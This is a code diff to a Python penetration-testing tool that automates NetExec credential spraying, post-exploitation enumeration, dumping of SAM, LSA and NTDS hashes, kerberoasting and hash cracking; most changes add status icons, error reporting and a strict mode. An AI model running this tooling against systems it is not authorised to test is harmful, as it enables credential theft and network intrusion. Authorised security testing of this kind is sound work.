@@ -27,6 +27,21 @@ BOLD = "\033[1m"
 DIM = "\033[2m"
 RESET = "\033[0m"
 
+# Status icons — one meaning per icon, used everywhere for consistency.
+ICON_OK        = f"{GREEN}✔{RESET}"         # action produced real, actionable data
+ICON_NOOP      = f"{YELLOW}⊘{RESET}"        # ran cleanly but produced nothing (expected, not a bug)
+ICON_FAIL      = f"{RED}✘{RESET}"           # real failure: subprocess error, I/O error, parse error
+ICON_WARN      = f"{YELLOW}{BOLD}⚠{RESET}"  # warning: degraded/disabled feature, lockout risk
+ICON_TIMEOUT   = f"{YELLOW}⏱{RESET}"        # network-level timeout
+ICON_SKIP      = f"{DIM}↷{RESET}"           # deliberately skipped (filter, dedup, stop-on-success)
+ICON_PWN3D     = f"{RED}{BOLD}💀{RESET}"    # cred grants admin on host
+ICON_HARVEST   = f"{GREEN}🧪{RESET}"        # hashes collected
+ICON_CRACK     = f"{CYAN}🔓{RESET}"         # cracking activity
+ICON_BLOODHOUND = f"{CYAN}🩸{RESET}"        # BloodHound / DC discovery
+ICON_FINDING   = f"{GREEN}{BOLD}⚡{RESET}"  # valid credential (live)
+ICON_HOST      = f"{GREEN}{BOLD}►{RESET}"   # per-host header
+ICON_SUBTASK   = f"{CYAN}{BOLD}▸{RESET}"    # post-exploit phase header
+
 ALL_PROTOCOLS = ["smb", "ssh", "ldap", "ftp", "wmi", "winrm", "rdp", "vnc", "mssql", "nfs"]
 LOCAL_AUTH_PROTOCOLS = {"smb", "wmi", "winrm", "rdp", "mssql"}
 # Protocols where nxc accepts -H NT hash auth. The rest (ssh/ftp/vnc/nfs) only do passwords.
@@ -135,29 +150,34 @@ V_NORMAL = 0
 V_VERBOSE = 1
 V_DEBUG = 2
 
-# Enumeration probes that nxc supports on SMB when --enum is on.
-SMB_ENUM_ACTIONS: list[tuple[str, list[str]]] = [
-    ("shares",   ["--shares"]),
-    ("users",    ["--users"]),
-    ("sessions", ["--sessions"]),
-    ("loggedon", ["--loggedon-users"]),
-    ("pass-pol", ["--pass-pol"]),
+# Each action: name, nxc args, and the substrings/patterns that prove the
+# action *produced data*. If exit code is 0 but none of these markers appear,
+# we report a yellow ⊘ ("ran cleanly, nothing to show") instead of a green ✔.
+SMB_ENUM_ACTIONS: list[dict] = [
+    {"name": "shares",   "args": ["--shares"],         "ok_markers": ["Sharename", "[Type]", "READ", "WRITE", "Pwn3d"]},
+    {"name": "users",    "args": ["--users"],          "ok_markers": ["[+]", "Username", "Total of"]},
+    {"name": "sessions", "args": ["--sessions"],       "ok_markers": ["Enumerated", "active session", "Username"]},
+    {"name": "loggedon", "args": ["--loggedon-users"], "ok_markers": ["[+]", "logged in", "logon time"]},
+    {"name": "pass-pol", "args": ["--pass-pol"],       "ok_markers": ["Minimum password", "Lockout", "Maximum password"]},
 ]
 
-# LDAP enum probes. {outfile} placeholders are substituted with paths in loot/.
-LDAP_ENUM_ACTIONS: list[tuple[str, list[str]]] = [
-    ("users",         ["--users"]),
-    ("admin-count",   ["--admin-count"]),
-    ("groups",        ["--groups"]),
-    ("asreproast",    ["--asreproast", "{outfile}"]),
-    ("kerberoasting", ["--kerberoasting", "{outfile}"]),
+# LDAP enum. {outfile} placeholder → substituted with the loot path at runtime.
+# For asreproast/kerberoasting we look for the krb hashcat marker, since nxc
+# writes them to the file rather than stdout.
+LDAP_ENUM_ACTIONS: list[dict] = [
+    {"name": "users",         "args": ["--users"],                       "ok_markers": ["[+]", "samaccountname"]},
+    {"name": "admin-count",   "args": ["--admin-count"],                 "ok_markers": ["[+]", "Found"]},
+    {"name": "groups",        "args": ["--groups"],                      "ok_markers": ["[+]", "Member"]},
+    {"name": "asreproast",    "args": ["--asreproast", "{outfile}"],     "ok_markers": ["$krb5asrep$"]},
+    {"name": "kerberoasting", "args": ["--kerberoasting", "{outfile}"],  "ok_markers": ["$krb5tgs$"]},
 ]
 
 # Secrets-dump probes fired when a SMB cred is (Pwn3d!) — auto-grow loot.
-SMB_SECRETS_ACTIONS: list[tuple[str, list[str]]] = [
-    ("sam",  ["--sam"]),
-    ("lsa",  ["--lsa"]),
-    ("ntds", ["--ntds"]),  # only meaningful on DCs; nxc errors otherwise (cheap)
+# Success = at least one user:rid:lm:nt::: line in the output.
+SMB_SECRETS_ACTIONS: list[dict] = [
+    {"name": "sam",  "args": ["--sam"],  "requires_dc": False, "ok_markers": [":::"]},
+    {"name": "lsa",  "args": ["--lsa"],  "requires_dc": False, "ok_markers": [":::", "DPAPI", "_SC_"]},
+    {"name": "ntds", "args": ["--ntds"], "requires_dc": True,  "ok_markers": [":::"]},
 ]
 
 # Heuristics for harvesting hashes out of nxc dump output.
@@ -212,6 +232,25 @@ CONNECTIVITY_TIMEOUT_PATTERNS = (
     "errno 111",
     "errno 113",
 )
+
+@dataclass
+class NxcActionResult:
+    """Return value of a post-exploit nxc invocation.
+
+    Carries both the raw process state (ok / exit / stdout / stderr) and the
+    loot path the output was teed to. Callers use _classify_action() to turn
+    this into a (status, note) tuple — the distinction between 'exit 0' and
+    'actually produced data' is what kept us from showing misleading ✔ icons."""
+    ok: bool
+    exit_code: int
+    stdout: str
+    stderr: str
+    loot_path: "Path"
+
+    @property
+    def combined(self) -> str:
+        return "\n".join(filter(None, (self.stdout, self.stderr)))
+
 
 @dataclass
 class Credential:
@@ -278,7 +317,9 @@ class HostCache:
         self.path = path
         self.ttl = ttl
         self.path.parent.mkdir(parents=True, exist_ok=True)
-        self._conn = sqlite3.connect(str(self.path))
+        # 30s busy-timeout absorbs concurrent runs / slow disks without
+        # the dreaded 'database is locked' crash.
+        self._conn = sqlite3.connect(str(self.path), timeout=30)
         self._conn.executescript(self.SCHEMA)
         self._conn.commit()
 
@@ -637,7 +678,9 @@ class HashCracker:
         return cmd
 
     def crack(self, hash_type: str, hash_file: Path) -> tuple[bool, list[tuple[str, str]]]:
-        """Run the cracker for one hash file. Returns (success, [(hash,plain)…])."""
+        """Run the cracker for one hash file. Returns (success, [(hash,plain)…]).
+        Last stderr is stashed on self for the caller to surface user-facing hints."""
+        self.last_stderr = ""
         cracker = self.cracker()
         if not cracker:
             return False, []
@@ -652,12 +695,36 @@ class HashCracker:
             self.log_cmd(f"crack {hash_type}", cmd, str(hash_file))
 
         try:
-            subprocess.run(cmd, capture_output=True, text=True, timeout=self.timeout)
+            res = subprocess.run(cmd, capture_output=True, text=True, timeout=self.timeout)
+            self.last_stderr = (res.stderr or "").strip()
         except subprocess.TimeoutExpired:
-            pass  # collect whatever the potfile already has
+            self.last_stderr = "timed out"
+        except FileNotFoundError as exc:
+            self.last_stderr = f"{exc.filename} not found"
+            return False, []
 
         cracked = self._collect_results(cracker, hash_type, hash_file)
         return True, cracked
+
+    def diagnose_zero_cracks(self) -> str | None:
+        """Given self.last_stderr, suggest the most likely reason cracking
+        produced no plaintexts. Returns None when no specific hint applies."""
+        s = (self.last_stderr or "").lower()
+        if not s:
+            return None
+        if "no hashes loaded" in s:
+            return "no hashes loaded — invalid hash format for this -m mode?"
+        if "hash-mode" in s and ("not supported" in s or "unknown" in s):
+            return "hashcat version doesn't support this hash mode"
+        if "salt-value" in s or "salt-length" in s:
+            return "hash format error (salt mismatch)"
+        if "exhausted" in s:
+            return "wordlist exhausted — try --crack-rules or a bigger wordlist"
+        if "timed out" in s:
+            return f"timed out after {self.timeout}s — raise --crack-timeout"
+        if "device" in s and ("not detected" in s or "no devices" in s):
+            return "no GPU detected, hashcat ran on CPU (slow)"
+        return None
 
     def _collect_results(self, cracker: str, hash_type: str, hash_file: Path) -> list[tuple[str, str]]:
         """Read potfile / john.pot to extract (hash, plaintext) pairs."""
@@ -752,6 +819,7 @@ class NxcAutomator:
         cracker: str = "auto",
         crack_rules: str | None = None,
         crack_timeout: int = CRACK_DEFAULT_TIMEOUT,
+        strict: bool = False,
     ):
         self.targets = self._read_value_or_file(target)
         self.mode = mode.lower()
@@ -829,6 +897,8 @@ class NxcAutomator:
             if crack_enabled else None
         )
         self.cracked_creds: list[dict] = []  # post-crack (user, plain) records
+        self.strict = strict
+        self.strict_errors: list[str] = []
 
         # Cross-host state populated during the run.
         self.valid_creds: list[dict] = []
@@ -1391,8 +1461,23 @@ class NxcAutomator:
                 key = futures[future]
                 try:
                     results[key] = future.result()
+                except FileNotFoundError as exc:
+                    # A required binary (likely nxc) vanished mid-run.
+                    msg = f"required command not found: {exc.filename or exc}"
+                    results[key] = [f"[!] {msg}"]
+                    self._record_error(msg)
+                except PermissionError as exc:
+                    msg = f"permission denied: {exc.filename or exc}"
+                    results[key] = [f"[!] {msg}"]
+                    self._record_error(msg)
+                except MemoryError:
+                    msg = "out of memory (subprocess output too large)"
+                    results[key] = [f"[!] {msg}"]
+                    self._record_error(msg)
                 except Exception as exc:
-                    results[key] = [f"[!] Error: {exc}"]
+                    msg = f"{type(exc).__name__}: {exc}"
+                    results[key] = [f"[!] unexpected error: {msg}"]
+                    self._record_error(msg)
         return results
 
     def _print_target_results(self, results: dict[TaskKey, list[str]], tasks: list[TaskKey]):
@@ -1588,10 +1673,10 @@ class NxcAutomator:
         local_auth: bool,
         extra_args: list[str],
         loot_path: Path,
-    ) -> bool:
-        """Run a follow-up nxc command (--shares, --users, -M ...) and save output."""
+    ) -> NxcActionResult:
+        """Run a follow-up nxc command (--shares, --users, -M ...) and persist output."""
         cmd = self._build_nxc_command(protocol, host, credential, local_auth)
-        # Drop the --log clause to keep the post-exploit log separate from main spray.
+        # Drop the --log clause: post-exploit output should live in loot/, not the main run log.
         if "--log" in cmd:
             i = cmd.index("--log")
             del cmd[i : i + 2]
@@ -1599,11 +1684,50 @@ class NxcAutomator:
         self._log_command(f"post-ex {' '.join(extra_args)}".strip(), cmd, target=host)
         try:
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=self.subprocess_timeout)
-            loot_path.write_text((result.stdout or "") + ("\n--- stderr ---\n" + result.stderr if result.stderr else ""))
-            return result.returncode == 0
+            stdout = result.stdout or ""
+            stderr = result.stderr or ""
+            try:
+                loot_path.write_text(stdout + ("\n--- stderr ---\n" + stderr if stderr else ""))
+            except OSError as exc:
+                self._record_error(f"cannot write loot {loot_path}: {exc}")
+            return NxcActionResult(
+                ok=(result.returncode == 0),
+                exit_code=result.returncode,
+                stdout=stdout, stderr=stderr, loot_path=loot_path,
+            )
         except subprocess.TimeoutExpired:
-            loot_path.write_text(f"timed out after {self.subprocess_timeout}s")
-            return False
+            try:
+                loot_path.write_text(f"timed out after {self.subprocess_timeout}s")
+            except OSError:
+                pass
+            return NxcActionResult(ok=False, exit_code=-1, stdout="", stderr="timed out", loot_path=loot_path)
+        except FileNotFoundError as exc:
+            # nxc disappeared mid-run — rare but worth surfacing distinctly.
+            self._record_error(f"nxc not found mid-run: {exc.filename}")
+            return NxcActionResult(ok=False, exit_code=127, stdout="", stderr=str(exc), loot_path=loot_path)
+
+    @staticmethod
+    def _classify_action(result: NxcActionResult, ok_markers: list[str], extra_text: str = "") -> tuple[str, str, str]:
+        """Decide icon + short note for a post-exploit action.
+
+        Returns (status, icon, note) where status is 'ok' / 'noop' / 'fail'.
+        ok_markers are substrings expected in result.combined OR in extra_text
+        (used when output lands in a file rather than stdout, e.g. asreproast)."""
+        if not result.ok and result.exit_code == -1:
+            return "fail", ICON_TIMEOUT, "timed out"
+        if not result.ok:
+            return "fail", ICON_FAIL, f"subprocess exit {result.exit_code}"
+        combined = (result.combined + "\n" + extra_text).lower()
+        # Auth-level rejection means the cred has no privilege for this action.
+        if NxcAutomator._contains_any_pattern(combined, AUTH_RESPONSE_PATTERNS):
+            return "noop", ICON_NOOP, "access denied (no privilege)"
+        if not any(m.lower() in combined for m in ok_markers):
+            return "noop", ICON_NOOP, "no data produced"
+        return "ok", ICON_OK, ""
+
+    def _record_error(self, msg: str):
+        """Bookkeeping for --strict and the final summary."""
+        self.strict_errors.append(msg)
 
     @staticmethod
     def _pick_best_cred(entries: list[dict]) -> dict | None:
@@ -1634,6 +1758,20 @@ class NxcAutomator:
         if ldap_target and self.enum_enabled:
             self._post_exploit_ldap(host, ldap_target)
 
+    def _is_likely_dc(self, host: str) -> bool:
+        """Heuristic: a host is a DC if our nmap cache shows LDAP open on it.
+        If we don't have cache data, fall back to 'maybe' (attempt anyway)."""
+        if not self.cache:
+            return True
+        cached = self.cache.get_fresh(host)
+        if cached is None:
+            return True
+        return any(cached.get(p) == "open" for p in (389, 636))
+
+    def _print_action(self, icon: str, name: str, note: str, loot_path: Path, name_width: int = 12):
+        suffix = f" {DIM}{note}{RESET}" if note else ""
+        print(f"    {icon} {name:<{name_width}} {DIM}→ {_truncate_path(loot_path)}{RESET}{suffix}")
+
     def _post_exploit_smb(self, host: str, target: dict):
         cred = target["credential"]
         local = target["local_auth"]
@@ -1642,21 +1780,29 @@ class NxcAutomator:
         host_dir = self.loot.dir_for(LootStore.safe_name(host), "smb", scope)
 
         if self.enum_enabled:
-            print(f"\n  {CYAN}{BOLD}▸ enum {host}{RESET} {DIM}(SMB {scope} as {cred.user or '<empty>'}){RESET}")
-            for name, args in SMB_ENUM_ACTIONS:
-                out = host_dir / f"{name}.txt"
-                ok = self._run_nxc_action("smb", host, cred, local, args, out)
-                icon = f"{GREEN}✔{RESET}" if ok else f"{YELLOW}⏱{RESET}"
-                print(f"    {icon} {name:<12} {DIM}→ {out}{RESET}")
-                if name == "pass-pol" and ok:
+            print(f"\n  {ICON_SUBTASK} enum {host} {DIM}(SMB {scope} as {cred.user or '<empty>'}){RESET}")
+            for action in SMB_ENUM_ACTIONS:
+                out = host_dir / f"{action['name']}.txt"
+                res = self._run_nxc_action("smb", host, cred, local, action["args"], out)
+                status, icon, note = self._classify_action(res, action["ok_markers"])
+                self._print_action(icon, action["name"], note, out)
+                if status == "fail":
+                    self._record_error(f"enum {action['name']} on {host}: {note}")
+                if action["name"] == "pass-pol" and status == "ok":
                     self._inspect_pass_pol(host, out)
 
         for mod in self.modules:
-            print(f"\n  {CYAN}{BOLD}▸ module {host}{RESET} {DIM}(SMB {scope} as {cred.user or '<empty>'}) -M {mod}{RESET}")
+            print(f"\n  {ICON_SUBTASK} module {host} {DIM}(SMB {scope} as {cred.user or '<empty>'}) -M {mod}{RESET}")
             out = host_dir / f"module-{LootStore.safe_name(mod)}.txt"
-            ok = self._run_nxc_action("smb", host, cred, local, ["-M", mod], out)
-            icon = f"{GREEN}✔{RESET}" if ok else f"{YELLOW}⏱{RESET}"
-            print(f"    {icon} {mod:<24} {DIM}→ {out}{RESET}")
+            res = self._run_nxc_action("smb", host, cred, local, ["-M", mod], out)
+            # Modules are opaque — we don't know what 'ok' looks like; trust exit code.
+            if not res.ok:
+                self._print_action(ICON_FAIL, mod, f"exit {res.exit_code}", out, name_width=24)
+                self._record_error(f"module {mod} on {host} failed")
+            elif res.combined.strip() == "":
+                self._print_action(ICON_NOOP, mod, "no output", out, name_width=24)
+            else:
+                self._print_action(ICON_OK, mod, "", out, name_width=24)
 
         if self.secretsdump and is_pwn3d:
             self._dump_secrets(host, cred, local, host_dir)
@@ -1664,26 +1810,42 @@ class NxcAutomator:
     def _post_exploit_ldap(self, host: str, target: dict):
         cred = target["credential"]
         host_dir = self.loot.dir_for(LootStore.safe_name(host), "ldap", "domain")
-        print(f"\n  {CYAN}{BOLD}▸ enum {host}{RESET} {DIM}(LDAP domain as {cred.user or '<empty>'}){RESET}")
-        for name, args in LDAP_ENUM_ACTIONS:
-            out = host_dir / f"{name}.txt"
-            # {outfile} placeholder: nxc writes hashes/etc to a file path, not stdout
-            substituted = [str(out) if a == "{outfile}" else a for a in args]
-            ok = self._run_nxc_action("ldap", host, cred, False, substituted, out)
-            icon = f"{GREEN}✔{RESET}" if ok else f"{YELLOW}⏱{RESET}"
-            print(f"    {icon} {name:<14} {DIM}→ {out}{RESET}")
-            if name in ("asreproast", "kerberoasting") and ok:
-                self._harvest_kerberos_hashes(host, name, out)
+        print(f"\n  {ICON_SUBTASK} enum {host} {DIM}(LDAP domain as {cred.user or '<empty>'}){RESET}")
+        for action in LDAP_ENUM_ACTIONS:
+            out = host_dir / f"{action['name']}.txt"
+            substituted = [str(out) if a == "{outfile}" else a for a in action["args"]]
+            res = self._run_nxc_action("ldap", host, cred, False, substituted, out)
+            # For asreproast/kerberoasting nxc writes to the file, not stdout —
+            # so we also read the file to check for the krb marker.
+            extra = ""
+            if action["name"] in ("asreproast", "kerberoasting") and out.exists():
+                try:
+                    extra = out.read_text(errors="replace")
+                except OSError:
+                    pass
+            status, icon, note = self._classify_action(res, action["ok_markers"], extra)
+            self._print_action(icon, action["name"], note, out, name_width=14)
+            if status == "fail":
+                self._record_error(f"ldap {action['name']} on {host}: {note}")
+            if action["name"] in ("asreproast", "kerberoasting") and status == "ok":
+                self._harvest_kerberos_hashes(host, action["name"], out)
 
     def _dump_secrets(self, host: str, cred: "Credential", local_auth: bool, host_dir: Path):
         """On (Pwn3d!) cred, dump SAM/LSA/NTDS hashes and grow the combo file."""
-        print(f"\n  {RED}{BOLD}💀 secretsdump {host}{RESET} {DIM}(SMB as {cred.user}){RESET}")
-        for name, args in SMB_SECRETS_ACTIONS:
+        print(f"\n  {ICON_PWN3D} secretsdump {host} {DIM}(SMB as {cred.user}){RESET}")
+        for action in SMB_SECRETS_ACTIONS:
+            name = action["name"]
             out = host_dir / f"secrets-{name}.txt"
-            ok = self._run_nxc_action("smb", host, cred, local_auth, args, out)
-            icon = f"{GREEN}✔{RESET}" if ok else f"{YELLOW}⏱{RESET}"
-            print(f"    {icon} {name:<6} {DIM}→ {out}{RESET}")
-            if ok:
+            # Skip NTDS on non-DC hosts — nxc would just error out.
+            if action["requires_dc"] and not self._is_likely_dc(host):
+                self._print_action(ICON_SKIP, name, "not a DC", out, name_width=6)
+                continue
+            res = self._run_nxc_action("smb", host, cred, local_auth, action["args"], out)
+            status, icon, note = self._classify_action(res, action["ok_markers"])
+            self._print_action(icon, name, note, out, name_width=6)
+            if status == "fail":
+                self._record_error(f"secretsdump {name} on {host}: {note}")
+            if status == "ok":
                 self._harvest_smb_hashes(host, name, out)
 
     def _harvest_smb_hashes(self, host: str, source: str, out: Path):
@@ -1717,12 +1879,18 @@ class NxcAutomator:
             return
         cracked_dir = self.cracker.cracked_dir()
         hash_file = cracked_dir / "nt-hashes.txt"
-        hash_file.write_text("\n".join(nt_hashes) + "\n")
+        try:
+            hash_file.write_text("\n".join(nt_hashes) + "\n")
+        except OSError as exc:
+            print(f"    {ICON_FAIL} cannot write {hash_file}: {exc}", file=sys.stderr)
+            self._record_error(f"cracker hash-file write failed: {exc}")
+            return
         wl = self.cracker.find_wordlist()
-        print(f"    {CYAN}🔓 cracking {len(nt_hashes)} NT hash(es) with {_truncate_path(wl)}…{RESET}")
+        print(f"    {ICON_CRACK} cracking {len(nt_hashes)} NT hash(es) with {_truncate_path(wl)}…")
         ok, pairs = self.cracker.crack("nt", hash_file)
         if not ok:
-            print(f"    {RED}✘ cracking failed (check {hash_file}){RESET}")
+            print(f"    {ICON_FAIL} cracker did not run (see {_truncate_path(hash_file)})", file=sys.stderr)
+            self._record_error(f"cracker failed on NT hashes: {self.cracker.last_stderr or 'unknown'}")
             return
         nt_to_user = {h["nt"].lower(): h["user"] for h in self.harvested_hashes if h.get("nt")}
         appended = 0
@@ -1737,11 +1905,13 @@ class NxcAutomator:
             appended += 1
         if appended:
             self._append_plain_creds_to_grow_combo(self.cracked_creds[-appended:])
-            print(f"    {GREEN}{BOLD}🔓 cracked {appended}/{len(nt_hashes)} → appended to {_truncate_path(self._effective_grow_combo())}{RESET}")
+            print(f"    {ICON_CRACK} {BOLD}cracked {appended}/{len(nt_hashes)}{RESET} → appended to {_truncate_path(self._effective_grow_combo())}")
             for e in self.cracked_creds[-appended:]:
                 print(f"      {GREEN}+ {e['user']}:{e['password']}{RESET}")
         else:
-            print(f"    {DIM}0/{len(nt_hashes)} cracked — try --crack-rules best64 or a bigger wordlist{RESET}")
+            hint = self.cracker.diagnose_zero_cracks()
+            tail = f" — {hint}" if hint else " — try --crack-rules best64 or a bigger wordlist"
+            print(f"    {ICON_NOOP} 0/{len(nt_hashes)} cracked{tail}")
 
     def _harvest_kerberos_hashes(self, host: str, source: str, out: Path):
         """asreproast/kerberoasting output is already in hashcat-ready format
@@ -1764,10 +1934,11 @@ class NxcAutomator:
         hash_type = "asrep" if source == "asreproast" else "tgs"
         user_re = KRB_AS_REP_USER_RE if hash_type == "asrep" else KRB_TGS_REP_USER_RE
         wl = self.cracker.find_wordlist()
-        print(f"    {CYAN}🔓 cracking {source} with {_truncate_path(wl)}…{RESET}")
+        print(f"    {ICON_CRACK} cracking {source} with {_truncate_path(wl)}…")
         ok, pairs = self.cracker.crack(hash_type, hash_file)
         if not ok:
-            print(f"    {RED}✘ cracking failed (check {hash_file}){RESET}")
+            print(f"    {ICON_FAIL} cracker did not run (see {_truncate_path(hash_file)})", file=sys.stderr)
+            self._record_error(f"cracker failed on {source}: {self.cracker.last_stderr or 'unknown'}")
             return
         appended = 0
         for hash_str, plain in pairs:
@@ -1780,11 +1951,13 @@ class NxcAutomator:
             appended += 1
         if appended:
             self._append_plain_creds_to_grow_combo(self.cracked_creds[-appended:])
-            print(f"    {GREEN}{BOLD}🔓 cracked {appended} {source} hash(es) → appended to {_truncate_path(self._effective_grow_combo())}{RESET}")
+            print(f"    {ICON_CRACK} {BOLD}cracked {appended} {source} hash(es){RESET} → appended to {_truncate_path(self._effective_grow_combo())}")
             for e in self.cracked_creds[-appended:]:
                 print(f"      {GREEN}+ {e['user']}:{e['password']}{RESET}")
         else:
-            print(f"    {DIM}0 cracked from {source}{RESET}")
+            hint = self.cracker.diagnose_zero_cracks()
+            tail = f" — {hint}" if hint else ""
+            print(f"    {ICON_NOOP} 0 cracked from {source}{tail}")
 
     def _append_plain_creds_to_grow_combo(self, entries: list[dict]):
         """Append plaintext (user, password) pairs to the grow-combo file —
@@ -1830,12 +2003,14 @@ class NxcAutomator:
         self.lockout_warnings.append({"host": host, "threshold": threshold, "duration": duration})
         if per_user_attempts > threshold:
             print(
-                f"\n  {RED}{BOLD}⚠ LOCKOUT RISK on {host}{RESET}: "
+                f"\n  {ICON_WARN} {RED}{BOLD}LOCKOUT RISK on {host}{RESET}: "
                 f"{RED}policy={threshold} attempts / {duration}, "
-                f"you're spraying ~{per_user_attempts} per user.{RESET}"
+                f"you're spraying ~{per_user_attempts} per user.{RESET}",
+                file=sys.stderr,
             )
             if self.delay == 0:
-                print(f"    {YELLOW}→ consider --delay 60 --jitter 30 for the next run{RESET}")
+                print(f"    {DIM}→ consider --delay 60 --jitter 30 for the next run{RESET}", file=sys.stderr)
+            self._record_error(f"lockout risk on {host} (policy={threshold})")
 
     @staticmethod
     def _resolve_dc_via_dns(domain: str, timeout: int = 5) -> list[str]:
@@ -1924,22 +2099,23 @@ class NxcAutomator:
                 dcs = list(hosts)
 
             if not dcs:
-                print(f"  {RED}✘ {domain}{RESET} {DIM}no DC candidate identified{RESET}")
+                print(f"  {ICON_NOOP} {domain} {DIM}no DC candidate identified — skipped{RESET}")
                 continue
 
             cred = self._pick_bloodhound_cred(domain)
             if not cred:
-                print(f"  {RED}✘ {domain}{RESET} {DIM}no domain credential available{RESET}")
+                print(f"  {ICON_NOOP} {domain} {DIM}no domain credential available — skipped{RESET}")
                 continue
 
             dc_ip = dcs[0]
-            print(f"  {CYAN}▸ {domain}{RESET} {DIM}via {dc_ip} as {cred.user}{RESET}")
+            print(f"  {ICON_SUBTASK} {domain} {DIM}via {dc_ip} as {cred.user}{RESET}")
             success, out_dir, err = self.bloodhound_runner.collect(domain, dc_ip, cred)
             if success:
-                print(f"    {GREEN}✔ collected{RESET} {DIM}→ {out_dir}{RESET}")
+                print(f"    {ICON_OK} collected {DIM}→ {_truncate_path(out_dir)}{RESET}")
             else:
-                print(f"    {RED}✘ failed{RESET} {DIM}{err}{RESET}")
-                print(f"    {DIM}→ {out_dir} (see stderr.log){RESET}")
+                print(f"    {ICON_FAIL} failed {DIM}{err}{RESET}")
+                print(f"    {DIM}→ {_truncate_path(out_dir)} (see stderr.log){RESET}")
+                self._record_error(f"bloodhound {domain}: {err or 'unknown'}")
 
     @staticmethod
     def _is_expandable_spec(target: str) -> bool:
@@ -2000,6 +2176,32 @@ class NxcAutomator:
                 protos.append(proto.upper())
         return ", ".join(protos) if protos else "none"
 
+    def _validate_flag_combinations(self):
+        """Warn (don't fail) when the user enabled a feature whose prerequisites
+        can never be met given the other flags. Cheap insurance against
+        'why didn't anything happen?' mysteries."""
+        warnings: list[str] = []
+        if self.crack_enabled and not self.secretsdump and not self.enum_enabled:
+            warnings.append(
+                "--crack is enabled but no hash sources are. Add --secretsdump "
+                "and/or --enum so the cracker has something to chew on."
+            )
+        if self.secretsdump and not self.enum_enabled:
+            warnings.append(
+                "--secretsdump without --enum skips the lockout-policy probe; "
+                "you won't get the password-policy warning before spraying."
+            )
+        only = self.only_protocols
+        if self.bloodhound_enabled and only and "smb" not in only and "ldap" not in only:
+            warnings.append(
+                "--bloodhound needs SMB or LDAP, but --only excludes both. "
+                "BloodHound collection will be skipped."
+            )
+        if self.modules and only and "smb" not in only:
+            warnings.append("--modules run on SMB but --only excludes it.")
+        for w in warnings:
+            print(f"  {ICON_WARN} {w}\n", file=sys.stderr)
+
     @staticmethod
     def _is_nxc_available() -> bool:
         try:
@@ -2026,15 +2228,15 @@ class NxcAutomator:
             sys.exit(127)
 
         if self.nmap_enabled and self.scanner is not None and not NmapScanner.is_available():
-            print(f"  {YELLOW}{BOLD}⚠ nmap not found in PATH — disabling pre-scan{RESET}\n")
+            print(f"  {ICON_WARN} nmap not found in PATH — disabling pre-scan\n", file=sys.stderr)
             self.nmap_enabled = False
             self.scanner = None
             if self.scan_only:
-                print(f"  {RED}{BOLD}✗ --scan-only requires nmap; aborting.{RESET}\n")
-                return
+                print(f"  {ICON_FAIL} --scan-only requires nmap; aborting.\n", file=sys.stderr)
+                sys.exit(2)
 
         if self.bloodhound_runner and not BloodHoundRunner.is_available():
-            print(f"  {YELLOW}{BOLD}⚠ bloodhound-python not found in PATH — disabling --bloodhound{RESET}\n")
+            print(f"  {ICON_WARN} bloodhound-python not found in PATH — disabling --bloodhound\n", file=sys.stderr)
             self.bloodhound_runner = None
             self.bloodhound_enabled = False
 
@@ -2042,19 +2244,22 @@ class NxcAutomator:
             chosen = self.cracker.cracker()
             wl = self.cracker.find_wordlist()
             if not chosen:
-                print(f"  {YELLOW}{BOLD}⚠ neither hashcat nor john found in PATH — disabling --crack{RESET}\n")
+                print(f"  {ICON_WARN} neither hashcat nor john found in PATH — disabling --crack\n", file=sys.stderr)
                 self.crack_enabled = False
                 self.cracker = None
             elif not wl:
                 print(
-                    f"  {YELLOW}{BOLD}⚠ wordlist not found — disabling --crack.{RESET}\n"
+                    f"  {ICON_WARN} wordlist not found — disabling --crack.\n"
                     f"  {DIM}Looked in:{RESET}\n"
                     + "".join(f"    {DIM}- {p}{RESET}\n" for p in WORDLIST_DEFAULT_PATHS)
                     + f"  {DIM}Pass --wordlist /path/to/file or download rockyou:{RESET}\n"
-                    f"    {DIM}wget -O ~/wordlists/rockyou.txt {ROCKYOU_DOWNLOAD_URL}{RESET}\n"
+                    f"    {DIM}wget -O ~/wordlists/rockyou.txt {ROCKYOU_DOWNLOAD_URL}{RESET}\n",
+                    file=sys.stderr,
                 )
                 self.crack_enabled = False
                 self.cracker = None
+
+        self._validate_flag_combinations()
 
         if self.verbosity > V_QUIET:
             self._print_scan_banner(total_attempts)
@@ -2117,9 +2322,31 @@ class NxcAutomator:
 
             if self.export_json_path or self.export_csv_path:
                 self._write_exports()
+
+            self._print_run_diagnostics()
         finally:
             if self.cache:
                 self.cache.close()
+
+        if self.strict and self.strict_errors:
+            sys.exit(1)
+
+    def _print_run_diagnostics(self):
+        """End-of-run summary of errors collected during the spray.
+        Always printed when non-empty; in --strict mode the exit code follows."""
+        if not self.strict_errors:
+            return
+        n = len(self.strict_errors)
+        head = f"\n{ICON_WARN} {BOLD}{n} error{'s' if n != 1 else ''} during this run:{RESET}"
+        if self.strict:
+            head += f" {RED}{BOLD}(--strict → exit 1){RESET}"
+        print(head, file=sys.stderr)
+        # Cap at 20 so we don't dump 500 timeouts to the user.
+        for err in self.strict_errors[:20]:
+            print(f"  {DIM}- {err}{RESET}", file=sys.stderr)
+        if n > 20:
+            print(f"  {DIM}... and {n - 20} more{RESET}", file=sys.stderr)
+        print(file=sys.stderr)
 
     def _write_exports(self):
         """Persist a structured summary of the run to JSON / CSV."""
@@ -2389,6 +2616,9 @@ def _build_parser():
                        help="Increase verbosity: -v adds commands + [-] lines, -vv adds raw [*] info.")
     g_out.add_argument("-q", "--quiet", action="store_true",
                        help="Print only valid credentials. Suppresses banner and per-host detail.")
+    g_out.add_argument("--strict", action="store_true",
+                       help="Exit with code 1 if any real error occurred (subprocess fail, I/O error, "
+                            "cracker failure). Useful in CI / scripted pipelines.")
 
     return parser
 
@@ -2496,6 +2726,7 @@ def main():
             cracker=args.cracker,
             crack_rules=args.crack_rules,
             crack_timeout=args.crack_timeout,
+            strict=args.strict,
         )
         runner.run()
     except ValueError as exc:
